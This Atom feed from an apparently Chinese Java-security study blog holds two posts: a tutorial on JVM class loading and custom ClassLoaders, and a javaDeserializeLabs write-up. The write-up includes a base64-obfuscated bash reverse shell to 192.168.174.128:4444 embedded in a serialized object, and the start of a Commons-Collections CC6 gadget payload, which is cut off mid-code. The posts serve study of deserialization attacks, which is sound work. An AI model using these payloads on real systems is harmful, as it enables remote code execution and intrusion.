<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>QWQ</title>
  
  
  <link href="https://xianbeil.github.io/atom.xml" rel="self"/>
  
  <link href="https://xianbeil.github.io/"/>
  <updated>2022-06-04T12:00:08.924Z</updated>
  <id>https://xianbeil.github.io/</id>
  
  <author>
    <name>Liyc</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>classloader类加载相关</title>
    <link href="https://xianbeil.github.io/2022/06/04/classloader%E5%AD%A6%E4%B9%A0/"/>
    <id>https://xianbeil.github.io/2022/06/04/classloader%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-06-04T11:58:49.000Z</published>
    <updated>2022-06-04T12:00:08.924Z</updated>
    
    <content type="html"><![CDATA[<h1 id="java代码执行流程"><a href="#java代码执行流程" class="headerlink" title="java代码执行流程"></a>java代码执行流程</h1><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220318204423-paolccp.png" alt="image.png"><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220318204536-oxlseqj.png" alt="image.png"></p><p>当 .java 源码被 javac.exe 编译器编译成 .class 字节码文件后，接下来的工作就交给JVM处理。JVM首先通过类加载器(ClassLoader)，将class文件和相关Java API加载装入JVM，以供JVM后续处理。</p><h1 id="类的加载过程"><a href="#类的加载过程" class="headerlink" title="类的加载过程"></a>类的加载过程</h1><p>类的生命周期包括：加载、链接、初始化、使用、卸载</p><p>其中前三个属于类的<u>加载过程</u></p><h2 id="加载-loading"><a href="#加载-loading" class="headerlink" title="加载-loading"></a>加载-loading</h2><p>把<code>.class</code>文件加载到JVM里的过程</p><ul><li>通过类的全限定名来获取定义此类的二进制字节流</li><li>将此二进制字节流所代表的静态存储结构转化成方法区的运行时数据结构</li><li>在内存中生成代表此类的java.lang.Class对象,作为该类访问入口.</li></ul><h2 id="链接-linking"><a href="#链接-linking" class="headerlink" title="链接-linking"></a>链接-linking</h2><p>链接分为三步</p><ul><li><p>验证:验证的目的是确保class文件的字节流中信息符合虚拟机的要求，不会危害虚拟机安全，使得虚拟机免受恶意代码的攻击，这一步至关重要。</p><blockquote><p>文件格式验证<br>源数据验证<br>字节码验证<br>符号引用验证  </p></blockquote></li><li><p>准备:准备阶段的工作就是为类的静态变量<strong>分配内存</strong>并设为jvm默认的<strong>初值</strong>，对于非静态的变量，则不会为它们分配内存。静态变量的初值为jvm默认的初值，而不是我们在程序中设定的初值。(仅包含类变量,不包含实例变量).</p></li><li><p>解析:虚拟机将常量池中的符号引用替换为直接引用，解析动作主要针对类或接口，字段，类方法，方法类型等等。</p></li></ul><h2 id="初始化-initialization"><a href="#初始化-initialization" class="headerlink" title="初始化-initialization"></a>初始化-initialization</h2><p>在该阶段，才真正意义上的开始执行类中定义的java程序代码，该阶段会执行类构造器。</p><blockquote><p>暂讨论关于类生命周期的三种，之后在学习内存的时候细嗦</p></blockquote><h1 id="类加载器ClassLoader"><a href="#类加载器ClassLoader" class="headerlink" title="类加载器ClassLoader"></a>类加载器ClassLoader</h1><h2 id="ClassLoader核心方法"><a href="#ClassLoader核心方法" class="headerlink" title="ClassLoader核心方法"></a>ClassLoader核心方法</h2><p>ClassLoader的核心方法有：</p><ol><li><code>loadClass</code> (加载指定的Java类)</li><li><code>findClass</code> (查找指定的Java类)</li><li><code>findLoadedClass</code> (查找JVM已经加载过的类)</li><li><code>defineClass</code> (定义一个Java类)</li><li><code>resolveClass</code> (链接指定的Java类)</li></ol><h2 id="ClassLoader的作用"><a href="#ClassLoader的作用" class="headerlink" title="ClassLoader的作用"></a>ClassLoader的作用</h2><blockquote><p><strong>Java程序在运行前需要先编译成<code>class文件</code>，Java类初始化的时候会调用<code>java.lang.ClassLoader</code>加载类字节码，<code>ClassLoader</code>会调用JVM的native方法(<code>defineClass0/1/2</code>)来定义一个<code>java.lang.Class</code>实例。</strong></p></blockquote><p>另外一个作用是确认每个类应该由哪个类加载器加载。<br>第二个作用也用于判断JVM运行时的两个类是否相等，影响的判断方法有equals()、isAssignableFrom()、isInstance()以及instanceof关键字。</p><h2 id="何时触发类加载"><a href="#何时触发类加载" class="headerlink" title="何时触发类加载"></a>何时触发类加载</h2><p>类加载的触发可以分为隐式加载和显示加载。</p><h3 id="隐式加载"><a href="#隐式加载" class="headerlink" title="隐式加载"></a>隐式加载</h3><p>隐式加载包括以下几种情况：</p><ul><li>遇到new、getstatic、putstatic、invokestatic这4条字节码指令时</li><li>对类进行反射调用时</li><li>当初始化一个类时，如果其父类还没有初始化，优先加载其父类并初始化</li><li>虚拟机启动时，需指定一个包含main函数的主类，优先加载并初始化这个主类</li></ul><h3 id="显式加载"><a href="#显式加载" class="headerlink" title="显式加载"></a>显式加载</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 反射加载TestHelloWorld示例</span></span><br><span class="line">Class.forName(<span class="string">&quot;top.longlone.TestHelloWorld&quot;</span>);</span><br><span class="line"><span class="comment">// ClassLoader加载TestHelloWorld示例</span></span><br><span class="line"><span class="built_in">this</span>.getClass().getClassLoader().loadClass(<span class="string">&quot;top.longlone.TestHelloWorld&quot;</span>);</span><br></pre></td></tr></table></figure><p>显示加载包含以下几种情况：</p><ul><li>通过ClassLoader的loadClass方法</li><li>通过Class.forName（反射获取Class）</li><li>通过ClassLoader的findClass方法</li></ul><h2 id="ClassLoader分类"><a href="#ClassLoader分类" class="headerlink" title="ClassLoader分类"></a>ClassLoader分类</h2><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220318210756-8jnb18t.png" alt="image.png"></p><p>从上到下认识他们</p><h3 id="启动类-x2F-引导类：Bootstrap-ClassLoader"><a href="#启动类-x2F-引导类：Bootstrap-ClassLoader" class="headerlink" title="启动类&#x2F;引导类：Bootstrap ClassLoader"></a>启动类&#x2F;引导类：Bootstrap ClassLoader</h3><p>这个类加载器使用C&#x2F;C++语言实现的，嵌套在JVM内部，java程序无法直接操作这个类。它用来加载<strong>Java核心类库</strong>，如：<code>JAVA_HOME/jre/lib/rt.jar</code>、<code>resources.jar</code>、<code>sun.boot.class.path</code>路径下的包，用于提供<strong>jvm运行所需的包</strong>。</p><p>并不是继承自java.lang.ClassLoader，它没有父类加载器</p><p>它加载<code>扩展类加载器</code>和<code>应用程序类加载器</code>，并成为他们的<strong>父类加载器</strong></p><p>出于安全考虑，启动类只加载包名为：java、javax、sun开头的类</p><h3 id="扩展类加载器：Extension-ClassLoader"><a href="#扩展类加载器：Extension-ClassLoader" class="headerlink" title="扩展类加载器：Extension ClassLoader"></a>扩展类加载器：Extension ClassLoader</h3><p>Java语言编写，由<code>sun.misc.Launcher$ExtClassLoader</code>实现，我们可以用Java程序操作这个加载器派生继承自java.lang.ClassLoader，父类加载器为<code>启动类加载器</code></p><p>从系统属性：<code>java.ext.dirs</code>目录中加载类库，或者从JDK安装目录：<code>jre/lib/ext</code>目录下加载类库。我们就可以将我们自己的包放在以上目录下，就会自动加载进来了。</p><h3 id="应用程序类加载器：Application-Classloader"><a href="#应用程序类加载器：Application-Classloader" class="headerlink" title="应用程序类加载器：Application Classloader"></a>应用程序类加载器：Application Classloader</h3><p>程序默认的类加载器，我们编写的类就是由他来加载。</p><p>Java语言编写，由sun.misc.Launcher$AppClassLoader实现。<br>派生继承自<code>java.lang.ClassLoader</code>，父类加载器为ExtClassloader</p><p>它负责加载环境变量classpath或者系统属性java.class.path指定路径下的类库</p><p>我们可以通过<code>ClassLoader#getSystemClassLoader()</code>获取并操作这个加载器</p><h3 id="自定义加载器"><a href="#自定义加载器" class="headerlink" title="自定义加载器"></a>自定义加载器</h3><p>为了实现自己的功能，比如加强安全传输，我们可以自己编写加载器。</p><p>继承<code>java.lang.ClassLoader</code>类，重写findClass()方法如果没有太复杂的需求，可以直接继承<code>URLClassLoader</code>类，重写<code>loadClass</code>方法，具体可参考<code>AppClassLoader</code>和<code>ExtClassLoader</code>。</p><h2 id="获取ClassLoader"><a href="#获取ClassLoader" class="headerlink" title="获取ClassLoader"></a>获取ClassLoader</h2><p>除了启动类加载器，其他加载器都是继承自<code>java.lang.ClassLoader</code>这个抽象类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方式一：获取当前类的 ClassLoader</span></span><br><span class="line">clazz.getClassLoader()</span><br><span class="line"><span class="comment">// 方式二：获取当前线程上下文的 ClassLoader</span></span><br><span class="line">Thread.currentThread().getContextClassLoader()</span><br><span class="line"><span class="comment">// 方式三：获取系统的 ClassLoader</span></span><br><span class="line">ClassLoader.getSystemClassLoader()</span><br><span class="line"><span class="comment">// 方式四：获取调用者的 ClassLoader</span></span><br><span class="line">DriverManager.getCallerClassLoader()</span><br></pre></td></tr></table></figure><h1 id="类加载流程"><a href="#类加载流程" class="headerlink" title="类加载流程"></a>类加载流程</h1><ol><li>调用<code>loadClass</code>加载</li><li>调用<code>findLoadedClass</code>检查是否已加载，若已加载则直接返回已加载的类</li><li>如果创建ClassLoader时传入了父类加载器(<code>new ClassLoader(父类加载器)</code>)则使用父类加载器先加载,否则使用JVM的<code>Bootstrap ClassLoader</code>加载</li><li>若父类加载器无法加载则调用自身<code>findClass</code>加载</li><li>如果调用loadClass的时候传入的<code>resolve</code>参数为true，那么还需要调用<code>resolveClass</code>方法链接类,默认为false</li><li>加载失败或返回加载后的<code>java.lang.Class</code>类对象</li></ol><h1 id="类加载机制-双亲委派"><a href="#类加载机制-双亲委派" class="headerlink" title="类加载机制-双亲委派"></a>类加载机制-双亲委派</h1><p>jvm对class文件采用的是按需加载的方式，当需要使用该类时，jvm才会将它的class文件加载到内存中产生class对象。</p><p>在加载类的时候，是采用的<code>双亲委派机制</code>，即把请求交给父类处理的一种<code>任务委派模式。</code></p><p>这也被叫做<code>双亲委派模型</code>，在jdk1.2之后引入</p><blockquote><p>其中，两个用户自定义类加载器的父加载器是AppClassLoader，AppClassLoader的父加载器是ExtClassLoader，ExtClassLoader是没有父类加载器的，在代码中，ExtClassLoader的父类加载器为null。BootstrapClassLoader也并没有子类，因为他完全由JVM实现。</p></blockquote><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220318212050-guhqqwe.png" alt="image.png"></p><h2 id="工作逻辑"><a href="#工作逻辑" class="headerlink" title="工作逻辑"></a>工作逻辑</h2><p>（1）如果一个<code>类加载器</code>接收到了<code>类加载</code>的请求，它自己不会先去加载，会把这个请求委托给<code>父类加载器</code>去执行。</p><p>（2）如果父类还存在父类加载器，则继续向上委托，一直委托到<code>启动类加载器：Bootstrap ClassLoader</code></p><p>（3）如果父类加载器可以完成加载任务，就返回成功结果，如果父类加载失败，就由子类自己去尝试加载，如果子类加载失败就会抛出<code>ClassNotFoundException</code>异常，这就是<code>双亲委派模式</code></p><h2 id="使用目的"><a href="#使用目的" class="headerlink" title="使用目的"></a>使用目的</h2><p>双亲委派模型能够保证类在内存中的<strong>唯一性</strong>，能够保证系统级别类的安全，因为当启动类ClassLoader加载过了之后，子ClassLoader便不会再加载：</p><p>1、防止重复加载同一个<code>.class</code>。通过委托去向上面问一问，加载过了，就不用再加载一遍。保证数据安全。<br>2、保证核心<code>.class</code>不能被篡改。通过委托方式，不会去篡改核心<code>.clas</code>，即使篡改也不会去加载，即使加载也不会是同一个<code>.class</code>对象了。不同的加载器加载同一个<code>.class</code>也不是同一个<code>Class</code>对象。这样保证了<code>Class</code>执行安全。</p><h2 id="运行原理"><a href="#运行原理" class="headerlink" title="运行原理"></a>运行原理</h2><p>loadClass方法如下，代码中做了注释解析</p><p>双亲委派模型实现的核心就是这个loadClass方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">        <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">        <span class="comment">// 先查看这个类是否已经被自己加载了</span></span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 如果有父类加载器，先委派给父类加载器来加载</span></span><br><span class="line">                <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                    c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 如果父类加载器为null，说明ExtClassLoader也没有找到目标类，则调用BootstrapClassLoader来查找</span></span><br><span class="line">                    c = findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果都没有找到，调用findClass方法，尝试自己加载这个类</span></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                <span class="comment">// to find the class.</span></span><br><span class="line">                <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                c = findClass(name);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h1><p>我们可以实现自己的类加载器，加载<strong>指定路径</strong>下的class文件</p><ul><li>通过loadClass在指定的路径下查找文件。</li><li>通过findClass方法解析class字节流，并实例化class对象。</li></ul><p>编写一个自己的ClassLoader</p><blockquote><p>defineClass：将字节码变成内存中的class</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xianbei.test3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String classPath;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestClassLoader</span><span class="params">(String classPath)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.classPath = classPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] classBytes = getData(name);</span><br><span class="line">            <span class="comment">//defineClass来生成class实例</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(name,classBytes,<span class="number">0</span>,classBytes.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//该方法读取目标class文件的字节码并返回</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] getData(String className) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> classPath+ File.separator + className.replace(<span class="string">&#x27;.&#x27;</span>, File.separatorChar) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//读取字节</span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">stream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((num = is.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                stream.write(buffer, <span class="number">0</span> ,num);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> stream.toByteArray();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们尝试加载自己电脑上指定路径的class文件：</p><p>这是我要加载的class文件，之前用JAVAssist控制字节码编写的恶意类</p><blockquote><p>这里有个静态块，就是最后的static</p><p>在实例化的时候会被自动加载</p><p>关于JAVAssist不在此多做赘述</p></blockquote><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220318233518-9dfmw13.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCLDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">TestClassLoader</span> <span class="variable">myClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestClassLoader</span>(<span class="string">&quot;C:\\Users\\Liyc\\IdeaProjects\\JavassistTest\\out&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; newStudent = myClassLoader.loadClass(<span class="string">&quot;NewStudent&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; c = newStudent.getDeclaredConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> c.newInstance(<span class="string">&quot;Xianbei&quot;</span>,<span class="number">19</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220318233657-sw8m038.png" alt="image.png"></p><p>成功弹出计算机，也就是成功加载了指定路径下的class文件并且用反射将其实例化了。</p><h1 id="URLClassLoader類代碼示例"><a href="#URLClassLoader類代碼示例" class="headerlink" title="URLClassLoader類代碼示例"></a>URLClassLoader類代碼示例</h1><p>URLClassLoader是ClassLoader的子类，它用于从指向 JAR 文件和目录的 URL 的搜索路径加载类和资源。也就是说，通过URLClassLoader就可以加载指定jar中的class到内存中。</p><p><a href="https://vimsky.com/zh-tw/examples/detail/java-class-java.net.URLClassLoader.html">https://vimsky.com/zh-tw/examples/detail/java-class-java.net.URLClassLoader.html</a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/9002">https://xz.aliyun.com/t/9002</a></p><p><a href="https://www.cnblogs.com/goloving/p/14438785.html">https://www.cnblogs.com/goloving/p/14438785.html</a>讲双亲委派的</p><p><a href="https://www.jianshu.com/p/fe8a01b0c3b7">https://www.jianshu.com/p/fe8a01b0c3b7</a>讲java代码运行机制的</p><p><a href="https://zhuanlan.zhihu.com/p/67991761">https://zhuanlan.zhihu.com/p/67991761</a>讲类加载的</p><p><a href="https://www.cnblogs.com/xrq730/p/4847337.html">https://www.cnblogs.com/xrq730/p/4847337.html</a>很多种类加载器的写法</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220318213310-uz3iggg.png" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;java代码执行流程&quot;&gt;&lt;a href=&quot;#java代码执行流程&quot; class=&quot;headerlink&quot; title=&quot;java代码执行流程&quot;&gt;&lt;/a&gt;java代码执行流程&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://assets.b3logfile.com</summary>
      
    
    
    
    <category term="javaSec" scheme="https://xianbeil.github.io/categories/javaSec/"/>
    
    
    <category term="ClassLoader学习" scheme="https://xianbeil.github.io/tags/ClassLoader%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>javaDeserializeLabs1，2</title>
    <link href="https://xianbeil.github.io/2022/06/01/serLab12/"/>
    <id>https://xianbeil.github.io/2022/06/01/serLab12/</id>
    <published>2022-06-01T15:05:35.000Z</published>
    <updated>2022-06-01T15:27:00.539Z</updated>
    
    <content type="html"><![CDATA[<h1 id="javaDeserializeLabs1，2"><a href="#javaDeserializeLabs1，2" class="headerlink" title="javaDeserializeLabs1，2"></a>javaDeserializeLabs1，2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>项目地址：<a href="https://github.com/waderwu/javaDeserializeLabs">https://github.com/waderwu/javaDeserializeLabs</a></p><p>其中涉及的知识面仍有未涉及部分，小目标：想在这学期离校前把他做完。</p><h2 id="Lab1-basic"><a href="#Lab1-basic" class="headerlink" title="Lab1-basic"></a>Lab1-basic</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.utils.Utils;</span><br><span class="line"><span class="keyword">import</span> com.yxxx.javasec.deserialize.Calc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Lab1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Calc</span> <span class="variable">calc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calc</span>();</span><br><span class="line">        setFieldValue(calc,<span class="string">&quot;canPopCalc&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">        setFieldValue(calc,<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        System.out.println(Utils.objectToHexString(calc));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用细节：</p><ol><li>jdk版本要和目标机器相同</li><li>calc类的包路径也要和目标一样</li><li>要反射修改域值</li></ol><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220601212131-ask7up6.png" alt="image.png"></p><h2 id="Lab2-ysoserial-Web"><a href="#Lab2-ysoserial-Web" class="headerlink" title="Lab2-ysoserial_Web"></a>Lab2-ysoserial_Web</h2><p>查看pom.xml，存在commons-collections3.2.1组件，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>用cc6，hashmap型，在shiro里面也自己构造过，就直接拿过来用了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.payload.lab2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.utils.Utils;</span><br><span 